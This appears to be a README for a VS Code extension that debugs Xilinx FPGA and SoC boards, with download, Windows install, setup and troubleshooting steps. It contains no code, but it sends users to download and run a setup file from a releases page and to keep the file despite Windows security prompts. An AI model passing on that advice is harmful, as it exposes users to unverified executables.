# 🔧 xilinx-native-debug - Debug Xilinx boards with ease

[Download the latest release](https://github.com/southpolar-wiring745/xilinx-native-debug/releases)

## 🚀 What this is

xilinx-native-debug is a VS Code extension for embedded debugging on Xilinx hardware. It helps you connect to a board, load code, program FPGA files, and start debug sessions from one place.

It is built for common Xilinx targets like:

- Zynq
- ZynqMP
- Versal
- MicroBlaze

Use it when you need to:

- bring up a board
- program an FPGA
- connect to a device with GDB or LLDB
- work with XSDB
- use a serial terminal during board tests

## 📥 Download

Go to the [releases page](https://github.com/southpolar-wiring745/xilinx-native-debug/releases) and download the latest package for Windows.

After the file downloads:

1. Open the downloaded release file.
2. Follow the on-screen steps.
3. Open Visual Studio Code.
4. Load the extension or start the included tool if the release package provides one.

If the release comes as a ZIP file, extract it first, then run the included app or install the extension file inside it.

## 🖥️ What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- Visual Studio Code
- A working USB or JTAG cable for your board
- A supported Xilinx target board
- Enough disk space for tools, logs, and build files

You may also need:

- Xilinx tools such as XSDB support
- a board file or device file for your target
- a serial port driver for your cable
- GDB or LLDB if you plan to debug from the command line

## 🧰 What it can do

This extension helps you handle common embedded tasks in one workflow:

- connect to Xilinx hardware
- start XSDB-based board setup
- program FPGA bitstreams
- launch debug sessions
- use GDB for standard debug flow
- use LLDB for supported setups
- watch serial output from the board
- work with Zynq, ZynqMP, Versal, and MicroBlaze targets

## 🪟 Install on Windows

1. Open the [releases page](https://github.com/southpolar-wiring745/xilinx-native-debug/releases).
2. Download the latest Windows file.
3. If the file is a ZIP archive, right-click it and choose Extract All.
4. Open the extracted folder.
5. If you see a VS Code extension file, install it in Visual Studio Code.
6. If you see an app or setup file, run it.
7. Restart Visual Studio Code if the installer asks for it.

If Windows shows a security prompt, choose the option to keep the file and continue only if it came from the release page above.

## 🧭 First setup

After install, open Visual Studio Code and set up your board connection.

1. Connect the board to your PC.
2. Turn on the board.
3. Open the xilinx-native-debug panel or command menu in VS Code.
4. Choose the target type for your board.
5. Select the right cable or port.
6. Start board bring-up.
7. Program the FPGA if your task needs it.
8. Start the debug session.

If you use a serial terminal, open it after the board boots so you can read startup messages.

## 🔌 Typical workflow

A simple debug flow looks like this:

1. Plug in the board.
2. Start VS Code.
3. Open xilinx-native-debug.
4. Connect through XSDB or the supported debug path.
5. Load the FPGA image if needed.
6. Start GDB or LLDB.
7. Set breakpoints.
8. Run the program and watch the output.

This workflow helps with early hardware tests, firmware checks, and app debug work on Xilinx systems.

## 🧪 Supported targets

The extension is made for these families:

- Zynq for common embedded boards
- Zynq UltraScale+ MPSoC for higher-end systems
- Versal for newer adaptive compute platforms
- MicroBlaze for soft processor designs

It fits projects that use:

- FreeRTOS
- JTAG access
- serial console output
- FPGA programming steps
- embedded system bring-up

## 🛠️ Troubleshooting

If the board does not connect:

- check the USB cable
- make sure the board has power
- confirm the JTAG cable is in place
- close other tools that may use the same port
- reopen VS Code and try again

If the board shows no serial output:

- check the COM port
- make sure the baud rate matches your board setup
- reconnect the cable
- restart the board

If FPGA programming fails:

- check that the image matches your board
- verify the target is selected correctly
- try a clean power cycle
- start from a fresh session

If debug does not start:

- confirm the program file is built for your target
- check that GDB or LLDB is set up
- make sure the board is in the right state before launch
- retry the connection after a full disconnect

## 📁 Suggested folder use

You may want to keep your files in a simple layout like this:

- one folder for board files
- one folder for FPGA images
- one folder for build output
- one folder for logs
- one folder for debug configs

A clean folder setup makes it easier to find the right file when you need to program or debug the board.

## 🔎 Keywords

amd, debugger, embedded, embedded-systems, fpga, freertos, gdb, hardware-debugging, jtag, lldb, microblaze, serial-terminal, soc, versal, vscode-extension, xilinx, xsdb, zynq, zynq-ultrascale, zynq7000

## 📎 Quick start checklist

- Download the latest release
- Install or extract the package
- Open Visual Studio Code
- Connect your Xilinx board
- Choose the target
- Program the FPGA if needed
- Start the debug session
- Use the serial terminal to watch board output